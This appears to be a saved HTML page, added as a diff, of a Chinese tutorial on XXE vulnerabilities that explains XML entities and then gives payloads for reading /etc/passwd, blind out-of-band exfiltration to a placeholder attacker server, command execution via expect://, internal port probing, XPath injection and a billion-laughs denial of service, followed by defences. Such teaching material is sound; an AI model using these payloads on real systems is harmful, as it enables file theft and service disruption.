@@ -1,0 +1,505 @@
+<!--
+   _   _                      _                 _
+  | | | |                    | |               | |
+  | |_| | ___  _ __ ___   ___| | __ _ _ __   __| |
+  |  _  |/ _ \| '_ ` _ \ / _ \ |/ _` | '_ \ / _` |
+  | | | | (_) | | | | | |  __/ | (_| | | | | (_| |
+  \_| |_/\___/|_| |_| |_|\___|_|\__,_|_| |_|\__,_|
+  ------------------------------------------------
+            https://github.com/ruby-china/homeland
+
+  - Ruby:  3.0.1-p64
+  - Rails: 6.1.4
+  - Homeland: 3.9.0-dev
+-->
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset='utf-8'>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="theme" content="auto">
+    <meta name="locale" content="zh-CN">
+    <title>浅谈XXE漏洞原理 · 大专栏</title>
+    <meta name="apple-mobile-web-app-capable" content="no">
+    <meta content='True' name='HandheldFriendly'>
+    <link rel="alternate" type="application/rss+xml" title="Subscribe" href="https://www.dazhuanlan.com/topics/feed">
+    <link rel="stylesheet" media="screen" href="https://www.dazhuanlan.com/packs/css/front-4a5d16fd.css" data-turbolinks-track="reload" />
+    
+    
+    <meta name="action-cable-url" content="/cable" />
+    <meta name="csrf-param" content="authenticity_token" />
+<meta name="csrf-token" content="Lxdw3MVjp6bmWmJE8sbAFsmEmYAM1i_QQgVvZS5tjz2vad2lSmi9pY3SMDYaci0nGeIEAIumYWheE0e9orfdEw" />
+    <style>pre{
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    }
+
+    </style>
+    <meta name="twitter:card" content="summary">
+    <meta property="twitter:title" content="浅谈XXE漏洞原理">
+      <meta property="twitter:description" content="11 Dec 2018 » Web 安全 0x00 前言 XXE（XML External Entity attack）漏洞，即 xml 外部实体注入攻击，最近几年被发现很多网站存在此漏洞。 0x01 XML 基础 什么是 XML X...">
+    <script src="https://www.dazhuanlan.com/packs/js/vendors-50efe7415183374b8f4f.chunk.js" data-turbolinks-track="reload"></script>
+<script src="https://www.dazhuanlan.com/packs/js/application-f55f325ed50f50278d04.js" data-turbolinks-track="reload"></script>
+    
+  </head>
+  <body class="page-topics" data-controller-name="topics">
+    <script src="https://www.dazhuanlan.com/packs/js/bootstrap-18e7584ea866fb90f989.js" data-turbolinks-eval="false"></script>
+    <div class="header navbar navbar-expand-md">
+      <div class="container">
+        <div class="navbar-header" data-turbolinks-permanent>
+          <a href="https://www.dazhuanlan.com/" class="navbar-brand"><b>大专栏</b></a>
+        </div>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#main-navbar">
+          <span class="navbar-toggler-icon"><i class="fa fa-bars"></i></span>
+        </button>
+        <div id="main-navbar"  class="collapse navbar-collapse">
+                <div class="navbar-topic-title">
+        <a href="#" class="topic-title pull-left" title="浅谈XXE漏洞原理" data-type="top">
+          <h1><span class="node">人工智能</span> <span class="title">浅谈XXE漏洞原理</span></h1>
+        </a>
+      </div>
+
+          <ul id="main-nav-menu" class="navbar-nav d-flex flex-md-row">
+  <li class="nav-item"><a class="nav-link" href="https://www.dazhuanlan.com/">社区</a></li><li class="nav-item"><a class="nav-link" href="https://www.dazhuanlan.com/sites">酷站</a></li>
+  
+</ul>
+
+        </div>
+        <div class="ml-auto d-flex navbar-right">
+          <form class="navbar-form d-none d-lg-flex mr-2 form-search active" action="https://www.dazhuanlan.com/search" method="GET">
+            <i class="fa btn-search fa-search"></i>
+            <input type="text" name="q" class="form-control" value="" placeholder="搜索"></input>
+        </form>
+        <ul class="nav navbar-nav user-bar">
+      <li class="nav-item"><a class="nav-link" href="https://www.dazhuanlan.com/account/sign_up">注册</a></li>
+    <li class="nav-item"><a class="nav-link" href="https://www.dazhuanlan.com/account/sign_in">登录</a></li>
+</ul>
+
+      </div>
+    </div>
+  </div>
+  
+  <div id="main" class="main-container container">
+    
+    <div class="row">
+  <div class="col-lg-9">
+    <div class="topic-detail card">
+      <div class="card-header media clearfix">
+  <div class="media-body">
+    <h1 class="media-heading">
+      <a class="node" href="https://www.dazhuanlan.com/topics/node3">人工智能</a>
+      <span class="title">
+        浅谈XXE漏洞原理
+      </span>
+      
+    </h1>
+    <div class="info">
+      <a data-author="true" class="user-name" data-name="9zer" href="https://www.dazhuanlan.com/i9zer">i9zer</a>
+      <span class="hidden-mobile">
+      </span>
+       ·
+      <abbr class="timeago" title="2019-12-14T04:09:48Z">2019年12月14日</abbr>
+      </span>
+       ·
+      73 次阅读
+    </div>
+  </div>
+  <div class="avatar media-right d-md-none">
+    <a title="i9zer (9zer)" href="https://www.dazhuanlan.com/i9zer"><img class="media-object avatar-48" src="https://www.dazhuanlan.com/system/letter_avatars/i.png" /></a>
+  </div>
+</div>
+
+      <div class="card-body markdown markdown-toc">
+        
+        <p><span class="time">11 Dec 2018</span> <span class="categories"> » <a href="https://www.dazhuanlan.com/category/Web%E5%AE%89%E5%85%A8">Web 安全</a> </span></p>
+
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>XXE（XML External Entity attack）漏洞，即 xml 外部实体注入攻击，最近几年被发现很多网站存在此漏洞。</p>
+<h2 id="0x01-xml基础">0x01 XML 基础</h2>
+<h3 id="什么是xml">什么是 XML</h3>
+<p>XML 是用于标记电子文件使其具有结构性的标记语言，很类似 HTML，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。其设计宗旨是传输数据，而非显示数据。</p>
+<p>标记语言，是一种将文本以及文本相关的其他信息结合起来，展现出关于文档结构和数据处理细节的电脑文字编码。与文本相关的其他信息（包括文本的结构和表示信息等）与原来的文本结合在一起，但是使用标记进行标识。</p>
+<h3 id="xml基础语法">XML 基础语法</h3>
+<p>XML 文档结构包括 XML 声明、DTD 文档类型定义（可选），文档元素</p>
+<p><img src="https://threeworld.github.io/images/1544445890(1).jpg" alt="1544445890(1)"></p>
+<p><strong>xml 声明：</strong></p>
+<p>xml 文档声明是由一组唯一名称标识的实体组成，始终以一个声明开始，这个声明指定该文档遵循 XML1.0 的规范。<code class="highlighter-rouge">encoding</code> 是指使用的字符编码方式，还有其他编码方式，<code class="highlighter-rouge">gbk</code>，<code class="highlighter-rouge">gb2312</code>等</p>
+<p><strong>文档类型定义：</strong></p>
+<p>可选，定义一些元素的数据类型和根元素，作用是定义 XML 文档的合法构建模块，可以在 XML 文档内部声明，也可以在外部引用。</p>
+<p>字符数据分以下两类：</p>
+<ul>
+<li>PCDATA（是指将要通过解析器进行解析的文本）</li>
+<li>CDATA（是指不要通过解析器进行解析的文本）</li>
+</ul>
+<p>其中不允许<code class="highlighter-rouge">CDATA</code>块之内使用字符串<code class="highlighter-rouge">]]&gt;</code>,因为它表示 CDATA 块的结束。</p>
+<p><strong>文档元素：</strong></p>
+<p>每个 XML 文件都必须有且只能有一个根元素。用于描述文档功能。可以自定义根元素。根据应用需要创建自定义的元素和属性。标签包括尖括号以及尖括号中的文本。元素是 XML 内容的基本单元。元素包括了开始标签、结束标签和标签之间的内容。</p>
+<pre class="highlight"><code><span class="nt">&lt;title&gt;</span>XML是可扩展标记语言<span class="nt">&lt;/title&gt;</span>
+</code></pre>
+<h3 id="实体">实体</h3>
+<p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量</p>
+<p>实体的引用是对实体的引用</p>
+<p>实体可在内部或外部进行声明</p>
+<p><strong>实体的分类：</strong></p>
+<ul>
+<li>
+<p>一般实体</p>
+<p>格式：<code class="highlighter-rouge">&amp;实体名;</code></p>
+</li>
+<li>
+<p>外部实体</p>
+<p>格式：<code class="highlighter-rouge">%实体名;</code></p>
+</li>
+</ul>
+<p><strong>注意：</strong>一般实体，可以在 XML 文档中的任何位置出现的实体称为一般实体。实体可以声明为内部实体还是外部实体。</p>
+<p>内部实体声明：</p>
+<pre class="highlight"><code><span class="cp">&lt;!ENTITY 引用名 "实体名称"&gt;</span>
+</code></pre>
+<p>外部实体声明：</p>
+<pre class="highlight"><code><span class="cp">&lt;!ENTITY 引用名 SYSTEM(PUBLIC) "URI地址"&gt;</span>
+</code></pre>
+<h3 id="例子">例子</h3>
+<pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root[
+&lt;!ENTITY file "引用字符1"&gt;</span>
+<span class="cp">&lt;!ENTITY % test SYSYTEM "URL地址"&gt;</span>
+%test;
+]&gt;
+<span class="nt">&lt;root&gt;</span>
+<span class="nt">&lt;title</span> <span class="na">value=</span><span class="s">"&amp;file;"</span><span class="nt">&gt;</span> <span class="ni">&amp;file;</span> <span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/root&gt;</span>
+</code></pre>
+<h2 id="0x02-xml外部实体注入">0x02 XML 外部实体注入</h2>
+<p>XXE 注入，即 XML External Entity，XML 外部实体注入。通过 XML 实体，” SYSTEM” 关键词导致 XML 解析器可以从本地文件或者远程 URI 中读取数据。所以攻击者可以通过 XML 实体传递自己构造的恶意值，是处理程序解析它。当引用外部实体时，通过构造恶意内容，可导致<strong>读取任意文件</strong>、<strong>执行系统命令</strong>、<strong>探测内网端口</strong>、<strong>攻击内网网站</strong>等危害。</p>
+<p>一般有三种攻击形式：</p>
+<ol>
+<li>
+<strong>基础的 XXE 注入</strong>— 外部实体注入本地 DTD。</li>
+<li>
+<strong>基于盲注的 XXE 注入</strong>—XML 解析器在响应中不显示任何错误。</li>
+<li>
+<strong>基于错误的 XXE 注入</strong>—成功解析之后，XML 解析器始终显示 SAME 响应。（即 “您的消息已被接收”），因此，我们可能希望解析器将文件的内容 “打印” 到错误响应中。</li>
+</ol>
+<h3 id="任意文件读取">任意文件读取</h3>
+<p>我们可以引用外部实体</p>
+<pre class="highlight"><code><span class="cp">&lt;!ENTITY 引用名 SYSTEM(PUBLIC) "URI地址"&gt;</span>
+</code></pre>
+<p>URL 地址可以支持多种协议，当然不同的程序支持的协议也不同：</p>
+<p><img src="https://threeworld.github.io/images/1544449506(1).jpg" alt="1544449506(1)"></p>
+<p>上图是默认支持协议，还可以支持其他，如 PHP 支持的扩展协议有</p>
+<p><img src="https://threeworld.github.io/images/1544450164(1).jpg" alt="1544450164(1)"></p>
+<pre class="highlight"><code><span class="cp">&lt;?xml version = "1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE ANY [
+    &lt;!ENTITY pass SYSTEM "file:///etc/passwd"&gt;</span>
+]&gt;
+<span class="nt">&lt;x&gt;</span><span class="ni">&amp;pass;</span><span class="nt">&lt;/x&gt;</span>
+</code></pre>
+<p>读取<code class="highlighter-rouge">/etc/passwd</code> 下的文件</p>
+<p><img src="https://threeworld.github.io/images/1544495349(1).jpg" alt="1544495349(1)"></p>
+<p>那么为什么该文件会被读取出来呢？</p>
+<ol>
+<li>xml 解析器将<code class="highlighter-rouge">/etc/passwd</code> 文件内容取出，赋值给了实体<code class="highlighter-rouge">pass</code>
+</li>
+<li>实体<code class="highlighter-rouge">f</code>的值作为元素<code class="highlighter-rouge">x</code>中的字符串数据被 php 解析的时候取出，作为对象里的内容</li>
+<li>然后再输出该对象的时候被打印出来。</li>
+</ol>
+<p>如果我们能控制外部实体的引用，那么我们就可以读我们想读的文件。</p>
+<h3 id="盲注的xxe任意文件读取">盲注的 XXE 任意文件读取</h3>
+<p>上面可知，xml 解析的内容可以被输出的时候，我们可以采取上述方式，那么如果解析的内容不被输出，也就是数据没有回显，那么怎么办？</p>
+<p>我们可以通过 <code class="highlighter-rouge">blind xxe</code> 进行攻击，主要使用了 DTD 约束中的参数实体和内部实体，前提是有一台攻击的服务器，大致的攻击步骤：</p>
+<ol>
+<li>利用 <code class="highlighter-rouge">file</code>协议读取本地文件</li>
+<li>利用 <code class="highlighter-rouge">http</code> 协议将文件内容访问攻击者的服务器</li>
+<li>查看服务器的日志</li>
+</ol>
+<p>我们来看一下下面的写法：</p>
+<pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root [
+&lt;!ENTITY % param1 "file:///etc/passwd"&gt;</span>
+<span class="cp">&lt;!ENTITY % param2 "<a href="http://vps_ip/?%25param1%22" rel="nofollow" target="_blank">http://vps_ip/?%param1"</a>;&gt;</span>
+%param2;
+]&gt;
+</code></pre>
+<p>此时 xml 解析时，就会将我们读取到的内容的 param1 实体带出，我们在 vps 服务器的 log 上就可以看到，但是上述构造存在语法问题。</p>
+<p><strong>原因：</strong> 不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>
+<p><img src="https://threeworld.github.io/images/1544451990(1).jpg" alt="1544451990(1)"></p>
+<p>解决方法：</p>
+<p>将嵌套的实体声明放在一个外部文件，一般放在攻击者的服务器上。</p>
+<p><strong>src.xml:</strong></p>
+<pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root[
+&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;</span>
+<span class="cp">&lt;!ENTITY % remote SYSTEM "<a href="http://vps_ip/evil.xml%22" rel="nofollow" target="_blank">http://vps_ip/evil.xml"</a>;&gt;</span>
+%remote;
+%all;
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;send;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre>
+<p><strong>evil.xml:</strong></p>
+<pre class="highlight"><code><span class="cp">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM '<a href="http://vps_ip/1.php?file=%25file" rel="nofollow" target="_blank">http://vps_ip/1.php?file=%file'</a>;;&gt;</span>"&gt;
+</code></pre>
+<p>那么上面的 xml 解析顺序为：</p>
+<ol>
+<li>
+<code class="highlighter-rouge">file</code> 实体变量被赋值为<code class="highlighter-rouge">/etc/passwd</code> 下的内容</li>
+<li>解析 <code class="highlighter-rouge">remote</code> 时候，访问<code class="highlighter-rouge"><a href="http://vps_ip/evil.xml" rel="nofollow" target="_blank">http://vps_ip/evil.xml</a></code>
+</li>
+<li>
+<code class="highlighter-rouge">evil.xml</code> 内有<code class="highlighter-rouge">all</code> 实体，由于是嵌套实体，开始解析<code class="highlighter-rouge">send</code> 实体</li>
+<li>解析 <code class="highlighter-rouge">send</code> 实体的时候访问 <code class="highlighter-rouge"><a href="http://vps_ip/1.php?file=%25file" rel="nofollow" target="_blank">http://vps_ip/1.php?file=%file</a>;</code>
+</li>
+<li>那么<code class="highlighter-rouge">file</code>将会访问 url，将数据带出。</li>
+</ol>
+<p>如果系统过滤了<code class="highlighter-rouge">ENTITY</code> 关键词时，可以尝试使用编码<code class="highlighter-rouge">utf-16,utf-7</code> 进行 bypass。</p>
+<h3 id="执行系统命令">执行系统命令</h3>
+<pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root[
+&lt;!ENTITY id SYSTEM "expect://id"&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;id;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre>
+<p>不过利用的前提是 php 安装了<code class="highlighter-rouge">expect</code> 扩展。</p>
+<h3 id="探测内网端口">探测内网端口</h3>
+<pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE root[
+&lt;!ENTITY id SYSTEM "<a href="http://192.168.1.101:81%22" rel="nofollow" target="_blank">http://192.168.1.101:81"</a>;&gt;</span>
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;id;</span><span class="nt">&lt;/root&gt;</span>
+</code></pre>
+<p>访问 8000 端口：</p>
+<p><img src="https://threeworld.github.io/images/1544461427(1).jpg" alt="1544461427(1)"></p>
+<p>访问 80 端口：</p>
+<p><img src="https://threeworld.github.io/images/1544461697(1).jpg" alt="1544461697(1)"></p>
+<p>通过返回的<code class="highlighter-rouge">Connection refused</code>可以知道该 81 端口是 closed 的，返回<code class="highlighter-rouge">HTTP REQUEST failed</code> 是开启的。</p>
+<h3 id="xpath-注入">Xpath 注入</h3>
+<p>xml 可以做数据传输，也可以将其当作数据库存储数据，有些类似于 SQL 注入，只是使用的函数不同。</p>
+<pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> 
+<span class="nt">&lt;users&gt;</span> 
+
+<p><span class="nt">&lt;user&gt;</span> 
+<span class="nt">&lt;firstname&gt;</span>Ben<span class="nt">&lt;/firstname&gt;</span>
+<span class="nt">&lt;lastname&gt;</span>Elmore<span class="nt">&lt;/lastname&gt;</span> 
+<span class="nt">&lt;loginID&gt;</span>abc<span class="nt">&lt;/loginID&gt;</span> 
+<span class="nt">&lt;password&gt;</span>test123<span class="nt">&lt;/password&gt;</span> 
+<span class="nt">&lt;/user&gt;</span> </p>
+
+<p><span class="nt">&lt;user&gt;</span> 
+<span class="nt">&lt;firstname&gt;</span>Shlomy<span class="nt">&lt;/firstname&gt;</span>
+<span class="nt">&lt;lastname&gt;</span>Gantz<span class="nt">&lt;/lastname&gt;</span>
+<span class="nt">&lt;loginID&gt;</span>xyz<span class="nt">&lt;/loginID&gt;</span> 
+<span class="nt">&lt;password&gt;</span>123test<span class="nt">&lt;/password&gt;</span> 
+<span class="nt">&lt;/user&gt;</span> 
+</p></code></pre>
+<p>其查询语句，也类似于 sql 语句</p>
+<pre class="highlight"><code>//users/user[loginID/text()=’abc’ and password/text()=’test123’]
+</code></pre>
+<p>所以相同的，我们可以用类似 sql 注入的方式来闭合引号例如：</p>
+<pre class="highlight"><code>loginID=' or 1=1 or ''='
+password=' or 1=1 or ''='
+</code></pre>
+<p>可以得到</p>
+<pre class="highlight"><code>//users/user[loginID/text()='' or 1=1 or ''='' and password/text()='' or 1=1 or ''='']
+</code></pre>
+<p>那么查询语句将返回 true</p>
+<h3 id="xpath盲注">Xpath 盲注</h3>
+<p>方法类似于 Sql 注入，只是函数可能使用不同 提取当前节点的父节点的名称：</p>
+<pre class="highlight"><code>' or substring(loginID(parent::<em>[position()=1]),1,1)='a
+' or substring(loginID(parent::</em>[position()=1]),1,1)='b
+' or substring(loginID(parent::<em>[position()=1]),1,1)='c
+....
+' or substring(loginID(parent::</em>[position()=1]),2,1)='a
+' or substring(loginID(parent::<em>[position()=1]),2,1)='b
+....
+</em></code></pre>
+<p>如此循环可得到一个完整的父节点名称 确定 address 节点的名称后，攻击者就可以轮流攻击它的每个子节点，提取出它们的名称与值。（通过索引）</p>
+<pre class="highlight"><code>'or substring(//user[1]/[2]/text(),1,1)='a' or 'a'='a
+'or substring(//user[1]/<em>[2]/text(),1,1)='b' or 'a'='a
+'or substring(//user[1]/</em>[2]/text(),1,1)='c' or 'a'='a
+.....
+</code></pre>
+<p>同时，既然将 xml 用作数据库，有可能存在泄漏问题,例如</p>
+<pre class="highlight"><code>accounts.xml
+databases.xml
+...
+</code></pre>
+<h3 id="dos攻击">DOS 攻击</h3>
+<pre class="highlight"><code><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE lolz [
+  &lt;!ENTITY lol "lol"&gt;</span>
+  <span class="cp">&lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;</span>
+  <span class="cp">&lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;</span>
+  <span class="cp">&lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;</span>
+  <span class="cp">&lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;</span>
+  <span class="cp">&lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;</span>
+  <span class="cp">&lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;</span>
+  <span class="cp">&lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;</span>
+  <span class="cp">&lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;</span>
+  ]&gt;
+<span class="nt">&lt;lolz&gt;</span><span class="ni">&amp;lol9;</span><span class="nt">&lt;/lolz&gt;</span>
+</code></pre>
+<p>该攻击通过创建一项递归的 XML 定义，在内存中生成十亿个” Ha！” 字符串，从而导致 DDoS 攻击。原理为：构造恶意的 XML 实体文件耗尽可用内存，因为许多 XML 解析器在解析 XML 文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p>
+<p>XXE 还有一些其他攻击方式，发挥你的想象。</p>
+<h2 id="0x03-防御xxe攻击">0x03 防御 XXE 攻击</h2>
+<p><strong>方案一、使用开发语言提供的禁用外部实体的方法</strong></p>
+<p>PHP：</p>
+<pre class="highlight"><code>libxml_disable_entity_loader(true);
+</code></pre>
+<p>其他语言:</p>
+<p><a href="https://www.owasp.org/index.php/XML_External_Entity_XXE)_Prevention_Cheat_Sheet" rel="nofollow" target="_blank">https://www.owasp.org/index.php/XML_External_Entity_XXE)_Prevention_Cheat_Sheet</a>(</p>
+<p><strong>方案二、过滤用户提交的 XML 数据</strong></p>
+<p>关键词：SYSTEM 和 PUBLIC。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://zh.wikipedia.org/zh-hans/XML" rel="nofollow" target="_blank">https://zh.wikipedia.org/zh-hans/XML</a></li>
+<li><a href="https://www.secpulse.com/archives/58915.html" rel="nofollow" target="_blank">https://www.secpulse.com/archives/58915.html</a></li>
+<li><a href="https://security.tencent.com/index.php/blog/msg/69" rel="nofollow" target="_blank">https://security.tencent.com/index.php/blog/msg/69</a></li>
+</ul>
+
+ <span style="float:left;">Share this on →  </span> <a href="https://twitter.com/share" class="twitter-share-button">Tweet</a> ! function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(! d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');
+
+
+
+(function(d, s, id) { var js, fjs = d.getElementsByTagName(s)[0]; if (d.getElementById(id)) return; js = d.createElement(s); js.id = id; js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&amp;version=v2.6&amp;appId=1749788565247320"; fjs.parentNode.insertBefore(js, fjs); }(document, 'script', 'facebook-jssdk'));
+ <a class="prev" href="https://www.dazhuanlan.com/%E5%AE%89%E5%85%A8%E9%80%9A%E4%BF%A1/2018/12/10/SSL%E8%AF%81%E4%B9%A6%E7%94%9F%E6%88%90%E4%B8%8E%E9%85%8D%E7%BD%AE.html">« SSL 证书的生成和配置</a> <a class="next" href="https://www.dazhuanlan.com/%E5%AE%89%E5%85%A8%E7%BC%96%E7%A8%8B/2018/12/15/Python%E5%AE%9E%E7%8E%B0%E5%9F%BA%E4%BA%8ESSL%E4%BC%A0%E8%BE%93%E7%9A%84%E5%8F%8D%E5%90%91shell.html">Python 实现基于 SSL 传输的反向 shell »</a>
+ /* &lt;![CDATA[ &lt;em&gt;/ var disqus_shortname = ""; var disqus_identifier = "&lt;a href="https://threeworld.github.io_XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86" rel="nofollow" target="_blank"&gt;https://threeworld.github.io_XXE 漏洞原理&lt;/a&gt;浅谈"; var disqus_title = "浅谈 XXE 漏洞原理"; /&lt;/em&gt; * * DON'T EDIT BELOW THIS LINE * * &lt;em&gt;/ (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); /&lt;/em&gt; ]]&gt; */ 
+        
+      </div>
+      <div class="card-footer clearfix">
+        <div class="opts">
+    <a title="取消赞" data-count="0" data-state="deactive" data-type="Topic" data-id="1191073" class="likeable deactive" href="#"><i class='icon fa fa-heart'></i> <span></span></a>
+    
+    
+  <div class="pull-right">
+    <div class="dropdown">
+      <a href="#" data-bs-toggle ="dropdown">
+        <i class='icon fa fa-ellipsis-v'></i>
+      </a>
+      <div class="dropdown-menu dropdown-menu-end">
+</div>
+
+    </div>
+  </div>
+</div>
+
+      </div>
+    </div>
+    
+      <div class="no-result">
+        暂无回复。
+      </div>
+      <div class="card">
+        <div class="card-body">
+          <div id="reply" class="form box">
+            <div style="padding:20px;" data-turbolinks-action="replace">
+              需要 <a href="https://www.dazhuanlan.com/account/sign_in" class="btn btn-primary">登录</a> 后方可回复, 如果你还没有账号请 <a href="https://www.dazhuanlan.com/account/sign_up">注册新账号</a>
+            </div>
+          </div>
+        </div>
+      </div>
+  </div>
+    <div class="sidebar hidden-mobile col-lg-3">
+      <div id="topic-sidebar" data-spy="affix" data-offset-bottom="65">
+  <div class="card">
+    <div class="card-body">
+      <div class="user-profile-card">
+  <div class="d-flex">
+    <div class="avatar-box">
+      <a title="i9zer (9zer)" href="https://www.dazhuanlan.com/i9zer"><img class="media-object avatar-48" src="https://www.dazhuanlan.com/system/letter_avatars/i.png" /></a>
+    </div>
+    <div class="flex-grow-1">
+      <a class="name-box" href="https://www.dazhuanlan.com/i9zer">
+        <div class="fullname">
+          9zer
+        </div>
+        <div class="login">
+          @i9zer
+        </div>
+</a>    </div>
+  </div>
+  <hr>
+  <div class="item social">
+  </div>
+    <hr>
+    <div class="item buttons flex aic">
+      
+    </div>
+</div>
+
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-body">
+      <div class="buttons">
+        <div class="group likes opts">
+          <a title="取消赞" data-count="0" data-state="deactive" data-type="Topic" data-id="1191073" class="likeable deactive" href="#"><i class='icon fa fa-heart'></i> <span></span></a>
+        </div>
+        <div class="group">
+          <div class="opts">
+            
+            
+          </div>
+        </div>
+      </div>
+      <hr>
+      <div class="group">
+        <div class='social-share-button' data-title='浅谈XXE漏洞原理' data-img=''
+data-url='' data-desc='' data-via=''>
+<a rel="nofollow " data-site="twitter" class="ssb-icon ssb-twitter" onclick="return SocialShareButton.share(this);" title="分享到 Twitter" href="#"></a>
+<a rel="nofollow " data-site="weibo" class="ssb-icon ssb-weibo" onclick="return SocialShareButton.share(this);" title="分享到 新浪微博" href="#"></a>
+<a rel="nofollow " data-site="facebook" class="ssb-icon ssb-facebook" onclick="return SocialShareButton.share(this);" title="分享到 Facebook" href="#"></a>
+<a rel="nofollow " data-site="wechat" class="ssb-icon ssb-wechat" onclick="return SocialShareButton.share(this);" title="分享到 微信" data-wechat-footer="打开微信，点击底部的 “发现”，&lt;br/&gt; 使用 “扫一扫” 即可将网页分享至朋友圈。" href="#"></a>
+</div>
+      </div>
+      <hr>
+      <div class="reply-buttons">
+        <div class="total">
+          共收到 <b>0</b> 条回复
+        </div>
+        
+      </div>
+    </div>
+  </div>
+  <div class="notify-updated">
+    <a class="update" href="#"><i class="fa fa-bell-o"></i> 收到新回复，点击立即加载</a>
+  </div>
+</div>
+
+    </div>
+</div>
+
+  </div>
+    <footer class="footer" id="footer" data-turbolinks-permanent>
+      <div class="container">
+        <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?2374bfdfe14a279e4a045267051b54e1";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+      </div>
+    </footer>
+  <script type="text/javascript" data-turbolinks-eval="false">
+    App.root_url = "https://www.dazhuanlan.com/";
+    App.asset_url = "";
+    App.twemoji_url = "https://twemoji.ruby-china.com/2";
+    App.locale = "zh-CN";
+  </script>
+    <script type="text/javascript">
+    Topics.topic_id = 1191073;
+    $(document).ready(function(){
+
+      $.post("/topics/1191073/read");
+    })
+  </script>
+
+  <script>
+    ga('create', '', 'auto');
+    ga('require', 'displayfeatures');
+    ga('send', 'pageview');
+  </script>
+  <div class="zoom-overlay"></div>
+</body>
+</html>
